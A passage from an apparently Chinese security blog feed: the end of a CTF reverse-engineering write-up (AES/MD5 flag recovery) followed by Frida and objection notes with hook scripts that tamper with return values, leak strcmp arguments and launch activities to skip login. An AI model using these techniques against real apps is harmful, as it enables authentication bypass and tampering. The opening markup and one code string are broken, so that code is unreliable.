class="hljs-keyword">else</span> &#123;<br>                    path[cx] = <span class="hljs-number">2</span>; <br>                    cy--;<br>                &#125;<br>                cx--;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= x; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, path[i]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br>***<br><span class="hljs-numberspan><br>***<br></code></pre></td></tr></table></figure><p>最后输出16进制小写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>data = <span class="hljs-string">&quotquot;</span><br><br>md5_full = hashlib.md5(data.encode()).hexdigest()<br>md5_16 = md5_full[<span class="hljs-number">8</span>:<span class="hljs-number">24</span>]<br><br><span class="hljs-built_in">print</span>(md5_16)<br><span class="hljs-comment">#f4135424cb2f161c</span><br></code></pre></td></tr></table></figure><h2 id="MidRe-1"><a href="#MidRe-1" class="headerlink" title="MidRe-1"></a>MidRe-1</h2><p>有花指令</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730529497849-dc9548f8-de42-4755-9585-0bab8762daee.png" class="" title="img"><p>中间一段始终无法处理，使得congratulatuion显示在main中</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730598130325-7584167f-39d6-4700-9e71-330f98d97ae8.png" class="" title="img"><p>一开始对输入有循环异或</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730599079070-23f82f1e-3d0a-4f25-9637-ea927a61c183.png" class="" title="img"><p>往上翻找到两个字符串</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730598205905-87a2ece3-597a-4bbc-be6d-674d3cf4534a.png" class="" title="img"><p>第一个是key，第二个是iv</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730598770313-5dd1aff8-2acb-4551-aa53-e1fa2e8f88e5.png" class="" title="img"><p>看上去有点像aes，findcrypt一下果然是</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730598702867-76c4cae8-396e-475c-b938-f9eb171438b1.png" class="" title="img"><p>当时解出来是这个，没有多想为什么前几位是正常的，赛后发现是0xb看成0x8了🥲</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730599195160-a385aee4-7fed-4cbc-800f-36aa0d425af4.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="hljs-keyword">import</span> Cipher, algorithms, modes<br><br>ciphertext = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x52</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span>,<br>    <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x8C</span>,<br>    <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x7F</span>,<br>    <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x72</span><br>])<br><br>key = <span class="hljs-string">&quot;5855eab53a2275d3&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>iv = <span class="hljs-string">&quot;b051a57d6d05b393&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br>cipher = Cipher(algorithms.AES(key), modes.CBC(iv))<br>decryptor = cipher.decryptor()<br><br><br>plaintext = decryptor.update(ciphertext) + decryptor.finalize()<br><br><br>plaintext_list = <span class="hljs-built_in">list</span>(plaintext)<br><br><br>a=[<span class="hljs-number">0x77</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plaintext_list)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(plaintext_list[i]^a[i%<span class="hljs-built_in">len</span>(a)]), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#726974812f6d9e532f9d838924e6c05f</span><br></code></pre></td></tr></table></figure><p>这里key和iv哪怕显示的是16进制依旧是utf-8格式</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730554990602-4587ef70-fe76-450a-b083-0c816977fa68.png" class="" title="img"><h1 id="信创安全"><a href="#信创安全" class="headerlink" title="信创安全"></a>信创安全</h1><h2 id="sm4rev-1"><a href="#sm4rev-1" class="headerlink" title="sm4rev-1"></a>sm4rev-1</h2><p>附件先是sh脚本，后续是未知文件</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730600720835-4edcf965-ac0a-48a8-8e5b-14cc3bf2dd44.png" class="" title="img"><p>看到dir和decompress，猜测可能是在解压，于是修改后缀为zip，解压得到elf</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730600630802-91d7d1f9-a907-4f3e-8635-8d55e81af030.png" class="" title="img"><p>题目提示是sm4,发现key和iv</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730600562841-10d41272-3517-4edc-ba70-043adb0e9863.png" class="" title="img"><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730602378970-d410599c-eef9-434d-b2de-4bef37e439fa.png" class="" title="img"><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pydas</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frida</title>
    <link href="/2024/10/28/frida/"/>
    <url>/2024/10/28/frida/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.kanxue.com/thread-280758.htm">https://bbs.kanxue.com/thread-280758.htm</a></p><p><a href="https://bbs.kanxue.com/thread-280812.htm#msg_header_h2_1">https://bbs.kanxue.com/thread-280812.htm#msg_header_h2_1</a></p><p>本地雷电模拟器Android9 x64，夜神模拟器Android7 x86</p><h1 id="连接模拟器"><a href="#连接模拟器" class="headerlink" title="连接模拟器"></a>连接模拟器</h1><p><a href="https://blog.csdn.net/kxltsuperr/article/details/133838337">https://blog.csdn.net/kxltsuperr/article/details/133838337</a></p><p><a href="https://blog.csdn.net/weixin_45541986/article/details/128319312">https://blog.csdn.net/weixin_45541986/article/details/128319312</a></p><p>10061说明模拟器没开<img src="/2024/10/28/frida/1710164574208-18b8d166-51bd-4a69-8039-6abde13ddbb9.png" class="" title="img"></p><p>先启动模拟器里的应用</p><p> 雷电模拟器：<code>adb connect 127.0.0.1:5555</code></p><p>夜神模拟器：<code>adb connect 127.0.0.1:62001</code></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">adb devices`，若有多个设备`adb.exe kill-server<br></code></pre></td></tr></table></figure><p>获得root权限<code>adb root</code>(失败的时候多试几次）</p><p>连接到远程<code>adb shell</code>，进入fs目录<code>cd /data/local/tmp</code>，<code>./fs</code>执行</p><p>一开始有两个设备，后面kill之后就只剩一个了</p><p>查看架构：adb shell getprop ro.product.cpu.abi</p><img src="/2024/10/28/frida/1708861679292-3ee1c9d0-731b-464e-a8d6-f4247e2905fd.png" class="" title="img"><p>先push，再去对应路径</p><img src="/2024/10/28/frida/1708862204362-fba47b0f-f174-470b-82fd-9c0d093265e0.png" class="" title="img"><p>也可以用共享文件夹传frida-server</p><img src="/2024/10/28/frida/1709106544067-2c326341-66b0-4547-b840-739326b8bf13.png" class="" title="img"><img src="/2024/10/28/frida/1709106683481-91eac644-f9c3-42ca-8c97-4743ccb31f01.png" class="" title="img"><h1 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h1><p>打开的方式安装不了可以拖动或者adb install</p><p>可通过下面路径查找日志</p><img src="/2024/10/28/frida/1724498694497-65c56f55-0eb0-4307-baad-0e425d2a4bde.png" class="" title="img"><p>处于开发者模式一直未被调试</p><img src="/2024/10/28/frida/1730102274627-e809a6dc-e147-4ccd-bd70-13d6eda9b9c1.png" class="" title="img"><p>可以关闭开发者模式</p><img src="/2024/10/28/frida/1730102659189-864d3663-4d42-4afc-8ae7-048946e21b15.png" class="" title="img"><p>安装的Android是7</p><img src="/2024/10/28/frida/1730102371141-b7e368ea-334d-4874-8421-7aee7c4949a9.png" class="" title="img"><p>虽然可以通过模拟器安装Android9，但是无法adb shell，因为找不到Android路径</p><img src="/2024/10/28/frida/1730102502794-a16bc096-091e-4fa4-8d25-8deae8d871c8.png" class="" title="img"><h1 id="用frida-server-hook"><a href="#用frida-server-hook" class="headerlink" title="用frida-server hook"></a>用frida-server hook</h1><p><a href="https://www.cnblogs.com/lxh2cwl/p/14842544.html">https://www.cnblogs.com/lxh2cwl/p/14842544.html</a></p><p>&#x2F;data&#x2F;local&#x2F;tmp目录下启动frida-server，必须要有上面的root权限：<code>./fs</code></p><img src="/2024/10/28/frida/1719835391861-c09cb64a-798d-48fa-9ff2-bd4484900fed.png" class="" title="img"><p>进行端口转发监听：<code>adb forward tcp:27042 tcp:27042</code></p><p>搜索特定进程：<code>frida-ps -U</code> | grep -i settings</p><p>查看进程真正包名：<code>frida-ps -U -a</code></p><p>输入空格键会有提示与补全 </p><h2 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h2><p>模拟器上启动软件后再去注入mobile包：<code>objection -g mobilego explore</code></p><img src="/2024/10/28/frida/1709109344969-4cc3e1af-1096-4c60-8771-0483fe7350d7.png" class="" title="img"><p>在内存中所有已加载的类中搜索包含game的类：<code>android hooking search classes game</code></p><p>查看com.android.settings.DisplaySettings类有哪些方法：<code>android hooking list class_methods com.android.settings.DisplaySettings</code></p><p>直接生成代码但可能没参数：<code>**android hooking generate  simple  com.android.settings.DisplaySettings**</code></p><p>在堆上搜索是否存在DisplaySettings类的实例：<code>android heap search instances com.android.settings.DisplaySettings</code></p><p>进入显示设置，软件如果没有做校验，可以直接使用这个命令跳过注册登录：<code>android intent launch_activity com.android.settings.DisplaySettings</code></p><p>识别应用程序的各种数据目录:<code>env</code></p><h2 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h2><p>hook类：<code>android hooking watch class android.bluetooth.BluetoothDevice</code></p><p>hook方法，查看参数、返回值和调用栈：<code>**android hooking watch class_method game.Game.checkflag --dump-args --dump-return --dump-backtrace**</code></p><p>在模拟器输入字符串ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl（符合题目要求）后，再<code>Called game.Game.checkflag(java.lang.String)</code>，得到return值</p><img src="/2024/10/28/frida/1709109675749-a27f484c-05c7-4662-a271-9eb7f9585c85.png" class="" title="img"><p>还可以import js代码</p><img src="/2024/10/28/frida/1719304694731-f541e617-8644-4a2d-ae02-461a589d0cfc.png" class="" title="img"><h2 id="hook脚本"><a href="#hook脚本" class="headerlink" title="hook脚本"></a>hook脚本</h2><p>frida -U -l 1.js -f com.example.myapplication</p><p>包名通过frida-ps -U -a查看</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>java层</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> <span class="hljs-title class_">Myjni</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.whathappened.MyJNI.Myjni&quot;</span>);<br>  <span class="hljs-title class_">Myjni</span>[<span class="hljs-string">&quot;getstr&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> re0 = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;getstr&quot;</span>](); <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;re0&#125;</span>`</span>); <br>    <span class="hljs-keyword">return</span> re0;<br>  &#125;;<br>&#125;);<br>                &#125;                  <br><span class="hljs-title function_">setImmediate</span>(main); <br><br><span class="hljs-comment">//也可以像下面这种自己设定参数然后返回</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">check</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">a,b</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Origin i and i2 = &quot;</span>,a,b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(a,b);<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook2</span>();<br>    &#125;)<br>&#125;<br> <br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>native层</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> check_flag = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateExports</span>(<span class="hljs-string">&quot;liba0x9.so&quot;</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;function&quot;</span>];<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Func address = &quot;</span>,check_flag);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(check_flag,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br> <br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Origin retval : &quot;</span>,retval);<br>            <span class="hljs-comment">//retval.replace(1337);</span><br>        &#125;<br>    &#125;)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(hook);<br></code></pre></td></tr></table></figure><h3 id="函数地址"><a href="#函数地址" class="headerlink" title="函数地址"></a>函数地址</h3><p>Module.enumerateImports(“libfrida0x8.so”)查看导入表</p><p>Module.findExportByName():通过提供导出项的名称作为参数，这个函数会返回与该名称对应的导出项的地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> func_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libmidand.so&quot;</span> , <span class="hljs-string">&quot;_Z10murmur3_32PKcjj&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;func addr is ---&quot;</span> + func_addr);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(func_addr, &#123;<br>  <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;enter murmur3_32 retvalue-&gt;\n&quot;</span> + <span class="hljs-title function_">hexdump</span>(args));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>java层可以直接拿函数名字来hook，so层就要先通过函数名来找到该函数的地址，然后以地址为基准进行hook</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">frida</span> -U -l <span class="hljs-number">1</span>.js  MidAnd<br></code></pre></td></tr></table></figure><p>frida -U -f com.example.demo1 –no-pause -l agent&#x2F;demo1&#x2F;demo1.js：-f指定目标应用程序的包名</p><img src="/2024/10/28/frida/1710167737741-cb30566e-19d1-4dba-8a89-5fa60ac95426.png" class="" title="img"><p>一开始一直不让输get返回值的命令，在模拟器端输入字符然后点login就好了</p><img src="/2024/10/28/frida/1710166946004-61d68afc-f771-4451-b35c-f5215bb59651.png" class="" title="img"><p>发现有返回值了</p><img src="/2024/10/28/frida/1710166891275-3b1302ac-022b-4296-b8c7-b9fdff543fea.png" class="" title="img"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br> <br>    <span class="hljs-keyword">var</span> targetAddress = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Strcmp Address: &quot;</span>,targetAddress.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br> <br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<span class="hljs-comment">//获取输入字符串</span><br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;111&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>            &#125;<br> <br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br> <br>        &#125;<br>    &#125;)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br>&#125;<br> <br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><h3 id="重载方法-实例方法-静态方法"><a href="#重载方法-实例方法-静态方法" class="headerlink" title="重载方法&#x2F;实例方法&#x2F;静态方法"></a>重载方法&#x2F;实例方法&#x2F;静态方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 相当于是找到类 Class 对象</span><br><span class="hljs-keyword">var</span> fridaDemo1Class = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.demo1.FridaDemo1&quot;</span>)<br><br><span class="hljs-comment">// hook com.example.demo1.FridaDemo1#func(int, int)</span><br>fridaDemo1Class.<span class="hljs-property">func</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">arg1, arg2</span>) &#123;<br>  <span class="hljs-comment">// 获取原函数的结果</span><br>  <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func</span>(arg1, arg2);<br>  <span class="hljs-comment">// 打印参数与结果</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;arg1, arg2, result&quot;</span>, arg1, arg2, result)<br>  <span class="hljs-comment">// 改变函数的结果</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">9527</span>;<br>&#125;<br><br><span class="hljs-comment">// hook com.example.demo1.FridaDemo1#func(java.lang.String)</span><br>fridaDemo1Class.<span class="hljs-property">func</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">arg1</span>) &#123;<br>  <span class="hljs-comment">// 构造一个 String 对象</span><br>  <span class="hljs-keyword">var</span> helloStr = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).$new(<span class="hljs-string">&#x27;Hello&#x27;</span>)<br>  <span class="hljs-comment">// 改变传递的参数，执行原函数</span><br>  <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func</span>(helloStr);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;arg1, result&quot;</span>, arg1, result)<br>  <span class="hljs-comment">// 返回 world</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).$new(<span class="hljs-string">&quot;World&quot;</span>);<br>&#125;<br><span class="hljs-comment">//所有实例方法</span><br><span class="hljs-comment">// 找到类的实例对象</span><br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.example.demo1.MainActivity&quot;</span>, &#123;<br>    <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">instance</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;found instance :&quot;</span>, 